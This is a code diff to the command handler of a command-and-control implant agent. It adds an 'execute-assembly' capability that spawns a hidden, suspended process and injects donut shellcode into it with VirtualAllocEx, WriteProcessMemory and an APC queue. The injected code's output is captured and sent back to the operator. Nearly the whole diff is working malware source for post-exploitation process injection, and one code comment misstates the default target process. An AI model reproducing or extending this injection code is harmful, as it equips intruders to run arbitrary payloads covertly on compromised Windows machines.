@@ -4,7 +4,7 @@
 #include <Package.h>
 #include <Core.h>
 
-#define Mana_COMMAND_LENGTH 10
+#define Mana_COMMAND_LENGTH 11
 
 Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
@@ -15,7 +15,8 @@ Mana_COMMAND Commands[ Mana_COMMAND_LENGTH ] = {
         { .ID = COMMAND_PWD,              .Function = CommandPwd },
         { .ID = COMMAND_CD,               .Function = CommandCd },
         { .ID = COMMAND_LS,               .Function = CommandLs },
-        { .ID = COMMAND_EBAPC,               .Function = CommandEbapc },
+        { .ID = COMMAND_EBAPC,            .Function = CommandEbapc },
+        { .ID = COMMAND_EXECUTE_ASSEMBLY, .Function = CommandExecuteAssembly },
 };
 
 VOID CommandDispatcher()
@@ -44,7 +45,7 @@ VOID CommandDispatcher()
 
         if ( DataBuffer && DataSize > 0 )
         {
-            PRINT_HEX( DataBuffer, DataSize )
+            //PRINT_HEX( DataBuffer, DataSize )
 
             ParserNew( &Parser, DataBuffer, DataSize );
             do
@@ -610,6 +611,189 @@ CleanupDownload:
         Content = NULL;
     }
 
+}
+
+//execute .net on a remote process by utilizing donut shellcode.
+//spawn msiexec by default, edit the agent.py to change the target process
+VOID CommandExecuteAssembly(PPARSER Parser)
+{
+    PPACKAGE            Package         = PackageCreate(COMMAND_OUTPUT);
+    CHAR                Output[8192]    = { 0 };
+    INT                 Offset          = 0;
+    DWORD               ShellcodeSize   = 0;
+    PBYTE               Shellcode       = NULL;
+    DWORD               SpawnSize       = 0;
+    PCHAR               SpawnProcess    = NULL;
+    CHAR                SpawnPath[MAX_PATH] = { 0 };
+    STARTUPINFOA        Si              = { 0 };
+    PROCESS_INFORMATION Pi              = { 0 };
+    SECURITY_ATTRIBUTES Sa              = { 0 };
+    HANDLE              hPipeRead       = NULL;
+    HANDLE              hPipeWrite      = NULL;
+    LPVOID              pRemote         = NULL;
+    DWORD               OldProtect      = 0;
+    CHAR                PipeBuffer[65536] = { 0 };
+    DWORD               BytesRead       = 0;
+    DWORD               TotalRead       = 0;
+    DWORD               BytesAvailable  = 0;
+
+    // Parse parameters
+    SpawnProcess = (PCHAR)ParserGetBytes(Parser, &SpawnSize);
+    Shellcode    = ParserGetBytes(Parser, &ShellcodeSize);
+
+    if (!Shellcode || ShellcodeSize == 0)
+    {
+        Offset += sprintf(Output + Offset, "[!] No shellcode provided\r\n");
+        goto Send;
+    }
+
+    // Set spawn process path
+    if (SpawnProcess && SpawnSize > 0)
+    {
+        memcpy(SpawnPath, SpawnProcess, SpawnSize < MAX_PATH - 1 ? SpawnSize : MAX_PATH - 1);
+    }
+    else
+    {
+        strcpy(SpawnPath, "C:\\Windows\\System32\\cmd.exe");
+    }
+
+    // Create pipe for output capture
+    Sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
+    Sa.bInheritHandle       = TRUE;
+    Sa.lpSecurityDescriptor = NULL;
+
+    if (!CreatePipe(&hPipeRead, &hPipeWrite, &Sa, 0))
+    {
+        Offset += sprintf(Output + Offset, "[!] CreatePipe failed: %lu\r\n", GetLastError());
+        goto Send;
+    }
+
+    // Ensure read handle is not inherited
+    SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);
+
+    // Setup startup info with redirected stdout/stderr
+    Si.cb          = sizeof(STARTUPINFOA);
+    Si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    Si.wShowWindow = SW_HIDE;
+    Si.hStdOutput  = hPipeWrite;
+    Si.hStdError   = hPipeWrite;
+    Si.hStdInput   = NULL;
+
+    // Create suspended process with redirected output
+    if (!CreateProcessA(
+            SpawnPath,
+            NULL,
+            NULL,
+            NULL,
+            TRUE,  // Inherit handles = TRUE 
+            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            &Si,
+            &Pi))
+    {
+        Offset += sprintf(Output + Offset, "[!] CreateProcessA failed: %lu\r\n", GetLastError());
+        goto Cleanup;
+    }
+
+    // Allocate memory in target process
+    pRemote = VirtualAllocEx(Pi.hProcess, NULL, ShellcodeSize,
+                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemote)
+    {
+        Offset += sprintf(Output + Offset, "[!] VirtualAllocEx failed: %lu\r\n", GetLastError());
+        TerminateProcess(Pi.hProcess, 0);
+        goto Cleanup;
+    }
+
+    // Write shellcode
+    if (!WriteProcessMemory(Pi.hProcess, pRemote, Shellcode, ShellcodeSize, NULL))
+    {
+        Offset += sprintf(Output + Offset, "[!] WriteProcessMemory failed: %lu\r\n", GetLastError());
+        TerminateProcess(Pi.hProcess, 0);
+        goto Cleanup;
+    }
+
+    // Make executable
+    VirtualProtectEx(Pi.hProcess, pRemote, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
+
+    // Queue APC and resume
+    QueueUserAPC((PAPCFUNC)pRemote, Pi.hThread, 0);
+    ResumeThread(Pi.hThread);
+
+    // Close write end of pipe (so ReadFile will return when process exits)
+    CloseHandle(hPipeWrite);
+    hPipeWrite = NULL;
+
+    // Wait for process to complete (with timeout)
+    WaitForSingleObject(Pi.hProcess, 60000);  // 60 second timeout
+
+    // Read all available output from pipe
+    TotalRead = 0;
+    while (TRUE)
+    {
+        // Check if data available
+        if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &BytesAvailable, NULL))
+            break;
+
+        if (BytesAvailable == 0)
+            break;
+
+        // Read data
+        DWORD ToRead = (BytesAvailable < sizeof(PipeBuffer) - TotalRead - 1) 
+                       ? BytesAvailable 
+                       : sizeof(PipeBuffer) - TotalRead - 1;
+
+        if (ToRead == 0)
+            break;
+
+        if (!ReadFile(hPipeRead, PipeBuffer + TotalRead, ToRead, &BytesRead, NULL))
+            break;
+
+        TotalRead += BytesRead;
+
+        if (TotalRead >= sizeof(PipeBuffer) - 1)
+            break;
+    }
+
+    // Null terminate
+    PipeBuffer[TotalRead] = '\0';
+
+    // Add output to response
+    if (TotalRead > 0)
+    {
+        Offset += sprintf(Output + Offset, "[+] Process Name: %s\r\n", SpawnPath);
+        Offset += sprintf(Output + Offset, "[+] PID: %lu\r\n", Pi.dwProcessId);
+        Offset += sprintf(Output + Offset, "[+] Assembly Output (%lu bytes):\r\n", TotalRead);
+        
+        // Append pipe output (truncate if needed)
+        DWORD CopyLen = TotalRead;
+        if (Offset + CopyLen > sizeof(Output) - 100)
+        {
+            CopyLen = sizeof(Output) - Offset - 100;
+        }
+        memcpy(Output + Offset, PipeBuffer, CopyLen);
+        Offset += CopyLen;
+    }
+    else
+    {
+        Offset += sprintf(Output + Offset, "[*] No output captured (assembly may have no console output)\r\n");
+    }
+
+Cleanup:
+    if (Pi.hProcess)
+    {
+        Offset += sprintf(Output + Offset, "[!] Terminating spawned process\r\n");
+        TerminateProcess(Pi.hProcess, 0);
+    }
+    if (hPipeRead)   CloseHandle(hPipeRead);
+    if (hPipeWrite)  CloseHandle(hPipeWrite);
+    if (Pi.hThread)  CloseHandle(Pi.hThread);
+    if (Pi.hProcess) CloseHandle(Pi.hProcess);
+
+Send:
+    PackageAddBytes(Package, (PBYTE)Output, Offset);
+    PackageTransmit(Package, NULL, NULL);
 }
 
 VOID CommandExit( PPARSER Parser )
